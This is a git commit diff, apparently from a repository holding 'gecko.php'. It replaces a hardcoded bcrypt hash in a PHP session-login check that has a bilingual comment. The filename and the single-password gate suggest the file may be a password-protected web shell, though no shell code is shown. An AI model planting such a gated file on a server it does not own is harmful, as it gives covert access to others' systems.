b459dfa0d22168da3c68b7613766e8fbb55bd5ee
jamur4d <jamur4d@gmail.com>
2025-04-24 22:52:51 +0700

    Update gecko.php

--- gecko.php
+++ gecko.php
@@ -60,7 +60,7 @@ function show_login_page($message = "")
 }
 
 if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2a$12$c2DQ231yzFJn6wX4nMSnZePePihr2yOnNxFFvPychWgt0zU4n9W/O'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
+    $stored_hashed_password = '$2a$12$.Pya2D/79vf.e.61lG1Qge4PAQdY1OHR6gzEpf4C1.lcLjhsoelXK'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
 
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
         $_SESSION['authenticated'] = true;
